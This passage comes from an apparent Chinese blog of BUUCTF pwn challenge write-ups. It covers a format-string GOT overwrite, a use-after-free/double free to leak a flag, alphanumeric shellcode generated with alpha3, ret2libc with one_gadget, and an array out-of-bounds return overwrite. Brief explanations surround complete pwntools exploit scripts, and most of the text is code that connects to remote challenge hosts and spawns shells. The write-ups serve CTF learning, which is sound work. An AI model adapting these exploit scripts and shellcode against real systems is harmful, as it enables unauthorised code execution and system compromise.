class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26407</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#----------------------------------------------</span><br>offest=<span class="hljs-number">8</span><br>sla(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;%9$spppp&#x27;</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libc_base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(system)<br><span class="hljs-comment">#---------------------------------------------</span><br>high_sys=(system&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>low_sys=system&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(high_sys-<span class="hljs-number">9</span>)+<span class="hljs-string">&#x27;c%12$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(low_sys-high_sys)+<span class="hljs-string">&#x27;c%13$hn&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)<br>payload = payload.ljust(<span class="hljs-number">32</span>,<span class="hljs-string">&quot;A&quot;</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>] + <span class="hljs-number">2</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>])<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,payload)<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;;bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-some-thing-exceting">gyctf_2020_some_thing_exceting</h3><p>这题存在uaf漏洞</p><p>程序开始时读入flag存在bss段的变量s处，且它的上面给了我们0x60大小</p><p>我们可以利用doublefree 分配0x60大小的chunk到此处，然后show</p><p><strong>疑虑</strong>：为啥现在中间要隔一个free，我记得以前做其他题直接连续free也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26961</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ba_length,ba_content,na_length,na_content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; ba\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(ba_length))<br>        sa(<span class="hljs-string">&#x27;&gt; ba : &#x27;</span>,ba_content)<br>        sla(<span class="hljs-string">&#x27;&gt; na\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(na_length))<br>        sa(<span class="hljs-string">&#x27;&gt; na : &#x27;</span>,na_content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &gt; SCP project ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>addr=<span class="hljs-number">0x602098</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,p64(addr))<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode-revenge">mrctf2020_shellcode_revenge</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）_mcmuyanga的博客-CSDN博客</a></p><p>这题ida，f5无法反汇编，报错在124D处</p><p>按g ，输入地址jump到那里发现是call rax，而rax与buf有关，看汇编代码发现buf是read函数我们可以输入的数据</p><p>这题也没开nx，我们在buf里填shell，最后就会call shell，</p><p>但上面还有一些判断条件：</p><p>read函数返回值，也就是eax，是读入的buf长度，存入[rbp+var_8]</p><p>即[rbp+var_8]=len（buf）</p><p>1.与0比较，我们要使他长度&gt;0</p><p>[rbp+var_4]=0</p><p>2.再与0比较，要使他长度&lt;0</p><p>这不是矛盾了么</p><p>然后发现程序有另一条路，绕一圈还能执行到这个判断语句</p><p>cdqe使用eax的最高位拓展rax高32位的所有位<br>movzx则是按无符号数传送+扩展（16-32）</p><p>EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位<br>大致就是将我们输入的字符串每一位进行比较，</p><p>范围是（0x60，0x7a）（0x2f,0x5a）这些范围的字符是</p><p>string.printable，就是可见字符shellcode。这里使用alpha3帮助我们生成</p><p>这位师傅：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">纯字符shellcode生成指南 | TaQini</a></p><p>直接下载TaQini师傅修改的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure><p>直接用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./shellcode_x64.sh rax<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25803</span>)<br>sc=<span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>r.send(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-brop64">axb_2019_brop64</h3><p>直接let2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_brop64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29428</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400963</span><br>repeater=<span class="hljs-number">0x400845</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(repeater))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-echo">inndy_echo</h3><p>32位格式化字符串改写strcmp_got为system，再填入binsh</p><p>32位直接用payload=fmtstr_payload(offset,{strcmp_got:system})</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./echo&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28185</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>offset=<span class="hljs-number">7</span><br>strcmp_got=elf.got[<span class="hljs-string">&#x27;strcmp&#x27;</span>]<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=fmtstr_payload(offset,&#123;strcmp_got:system&#125;)<br>sl(payload)<br>sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-name-your-cat">wustctf2020_name_your_cat</h3><p>数组越界</p><p>可以直接跳至ret</p><p>说一下为什么要循环四次:</p><p>我们改的是vulnerable的ret，他要ret的话，要结束5个循环，所以先填4个循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_name_your_cat&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29315</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = 